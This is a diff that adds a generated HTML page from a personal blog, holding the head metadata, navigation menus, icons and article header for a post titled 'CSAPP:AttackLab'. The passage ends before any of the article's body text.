@@ -1,0 +1,1672 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>CSAPP:AttackLab &middot; Mio&#39;s Tea Time</title>
+  <meta name="title" content="CSAPP:AttackLab &middot; Mio&#39;s Tea Time" />
+  
+  <meta name="description" content="Mio&#39;s Tea Time" />
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/csapp/csappattacklab/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.1c9cd0d1ebaf117272b5c4f6bd49878475cb210d5e0da4f061632d779f5bb46851881c187e6e634dba5071c4e3d80e7d5cec1dd80443b2fa68acd358f9eda881.css"
+    integrity="sha512-HJzQ0euvEXJytcT2vUmHhHXLIQ1eDaTwYWMtd59btGhRiBwYfm5jTbpQccTj2A59XOwd2ARDsvporNNY&#43;e2ogQ==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.3ad74b33440334ca29f8801ec6dac1f314951cf580e503d49631816b48d1f28d03543275f92b651565b48045b90731f47595b1396214b8b6aa11c6990f867f7e.js"
+    integrity="sha512-OtdLM0QDNMop&#43;IAextrB8xSVHPWA5QPUljGBa0jR8o0DVDJ1&#43;StlFWW0gEW5BzH0dZWxOWIUuLaqEcaZD4Z/fg==" data-copy="" data-copied=""></script>
+  
+  
+  
+  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/csapp/csappattacklab/">
+  <meta property="og:site_name" content="Mio&#39;s Tea Time">
+  <meta property="og:title" content="CSAPP:AttackLab">
+  <meta property="og:description" content="本期封面是动漫《Girls Band Cry》的主角团一行人参拜时的场景。
+CSAPP:AttackLab # [!WARNING]">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="csapp">
+    <meta property="article:published_time" content="2025-03-20T15:49:11+08:00">
+    <meta property="article:modified_time" content="2025-03-20T15:49:11+08:00">
+    <meta property="og:image" content="http://localhost:1313/csapp/csappattacklab/featured1.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/csapp/csappattacklab/featured1.png">
+  <meta name="twitter:title" content="CSAPP:AttackLab">
+  <meta name="twitter:description" content="本期封面是动漫《Girls Band Cry》的主角团一行人参拜时的场景。
+CSAPP:AttackLab # [!WARNING]">
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "",
+    "name": "CSAPP:AttackLab",
+    "headline": "CSAPP:AttackLab",
+    
+    "abstract": "\u003cblockquote\u003e\n\u003cp\u003e本期封面是动漫《Girls Band Cry》的主角团一行人参拜时的场景。\u003c\/p\u003e\u003c\/blockquote\u003e\n\n\n\u003ch1 class=\u0022relative group\u0022\u003eCSAPP:AttackLab \n    \u003cdiv id=\u0022csappattacklab\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\u0022\u003e\n        \u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700\u0022\n            style=\u0022text-decoration-line: none !important;\u0022 href=\u0022#csappattacklab\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e        \n    \n\u003c\/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e[!WARNING]\u003c\/p\u003e",
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/csapp\/csappattacklab\/",
+    "author" : {
+      "@type": "Person",
+      "name": "mio"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-03-20T15:49:11\u002b08:00",
+    "datePublished": "2025-03-20T15:49:11\u002b08:00",
+    
+    "dateModified": "2025-03-20T15:49:11\u002b08:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2105"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="mio" />
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3">
+    
+    
+    
+    <div>
+        <a href="/" class="flex">
+            <span class="sr-only">Mio&rsquo;s Tea Time</span>
+
+            
+            <img src="/img/logo.png" width="342" height="318"
+                class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="Mio&#39;s Tea Time" />
+            
+
+        </a>
+    </div>
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Mio&rsquo;s Tea Time</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+
+            
+            
+             
+  <div>
+  <div class="cursor-pointer flex items-center nested-menu">
+    
+    <a  class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
+      Class
+    </a>
+    <span>
+      
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+    </span>
+  </div>
+  <div class="absolute menuhide">
+    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
+      <div class="flex flex-col space-y-3">
+        
+        <a href="/csapp/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            CS:APP
+          </p>
+        </a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+            
+            
+  <a href="/tech/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="Tech">
+        Tech
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/thinking/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="Thinking">
+        Thinking
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/author/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Author
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="https://github.com/Ada-Church-Closure"  target="_blank"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <span >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+    </span>
+    
+    <p class="text-base font-medium" title="">
+        
+    </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class=" flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 md:hidden">
+
+        <label id="menu-button" class="block">
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li id="menu-close-button">
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                     
+  <li class="mt-1">
+    <a href="" class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Class
+        </p>
+        <span>
+            
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+        </span>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/csapp/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            CS:APP
+        </p>
+    </a>
+</li>
+
+<li class="mb-2"></li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/tech/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="Tech">
+            Tech
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/thinking/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="Thinking">
+            Thinking
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/author/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Author
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="https://github.com/Ada-Church-Closure"  target="_blank"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <div >
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+
+        </div>
+        
+        <p class="text-bg font-bg" title="">
+            
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      CSAPP:AttackLab
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-03-20T15:49:11&#43;08:00">20 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>2105 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">10 mins</span><span class="px-2 text-primary-500">&middot;</span><span>
+  
+  
+    
+    
+      
+      
+        
+        
+      
+      
+    
+  
+  <span id="views_csapp/CSAPP:AttackLab/index.md" class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title="views">loading</span>
+  <span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
+<path fill="currentColor" d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg>
+  </span>
+
+</span>
+</span><span class="px-2 text-primary-500">&middot;</span><span>
+  
+  
+    
+    
+      
+      
+        
+        
+      
+      
+    
+  
+  <span id="likes_csapp/CSAPP:AttackLab/index.md"
+    class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400"
+    title="likes">loading</span>
+  <span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+<path fill="currentColor" d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg>
+  </span>
+
+</span>
+</span><span class="px-2 text-primary-500">&middot;</span><span>
+    <button id="button_likes"
+        class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+        onclick="process_article()">
+        <span id="button_likes_heart" style="display:none" class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+<path fill="currentColor" d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg>
+  </span>
+
+ </span>
+        <span id="button_likes_emtpty_heart" class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
